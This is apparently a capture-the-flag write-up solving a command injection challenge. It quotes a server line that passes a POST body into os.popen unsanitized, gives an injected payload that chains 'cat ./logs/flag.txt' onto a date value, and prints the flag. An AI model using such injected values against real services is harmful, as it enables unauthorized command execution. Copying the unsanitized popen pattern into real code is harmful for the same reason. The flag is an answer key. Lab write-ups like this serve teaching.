## WEB-1: Command Injection
**Description:**  
This challenge demonstrates an insecure server-side implementation of `os.popen()` that leads to command injection via unvalidated user input.
<details> <summary><b>Reveal Hidden Flag</b></summary>
flag{02c0953556}
</details></br>

**Solution Summary:**
- By analyzing `client.py` and `server.py`, I discovered the existence of `/view` and `/logs` endpoints.
- The `/view` endpoint handles `POST` requests with a date string in the body.
- The server constructs a shell command using this user-supplied input without sanitization, enabling command injection.
- By injecting `; cat ./logs/flag.txt;`, I was able to retrieve the flag.

**Exploitation Steps:**
1. Inspected the `client.py` and `server.py` files in the `/ctf` directory, which revealed the following routes:
    ```plaintext
    /
    /view
    /logs
    ```
2. Probed the endpoints using wget:
    ```bash
    wget http://192.168.1.2/         # Displays welcome message with hint about /view
    wget http://192.168.1.2/view     # Shows list of log files in ./logs/
    wget http://192.168.1.2/logs     # No response (likely not a valid route)
    ```

3. Tested `POST` requests to `/view`:
    ```bash
    wget http://192.168.1.2/view --post-data=20240112       # Displays 20240112.html
    wget http://192.168.1.2/view --post-data=flag           # Returns 404
    wget http://192.168.1.2/view --post-data=flag.txt       # Also fails
    ```

4. Identified the vulnerability in `server.py`:
    ```python
    result = os.popen(f"cat ./logs/{date}.html").read()
    ```
    The `{date}` input is used directly in a shell command — making command injection possible.

5. Confirmed the target file via /view, which reveals:
    ```bash
    ls -l ./logs/
    ```
    Output includes:
    ```html
    -rw-rw-r-- 1 1000 1000 733 Jan 12 07:51 20240112.html
    -rw-rw-r-- 1 1000 1000  16 Apr 29 2025 flag.txt
    ```

6. Crafted the exploit
    - Copied `client.py` to `post.py` to modify and inject a command via the POST body.
        - Original:
            ```python
            req = "POST /view HTTP/1.1\r\nHost: localhost\r\n\r\n20240112"
            ```
        - Injected:
            ```python
            req = "POST /view HTTP/1.1\r\nHost: localhost\r\n\r\n20240112.html; cat ./logs/flag.txt;"
            ````

7. Code Context (from server.py)
    ```python
    date = request.body.strip()
    result = os.popen(f"cat ./logs/{date}.html").read()
    ```
    _Since the input is unsanitized, injection like `; cat ./logs/flag.txt;` successfully executes._

8. The server returned the contents of `flag.txt` in the HTTP response.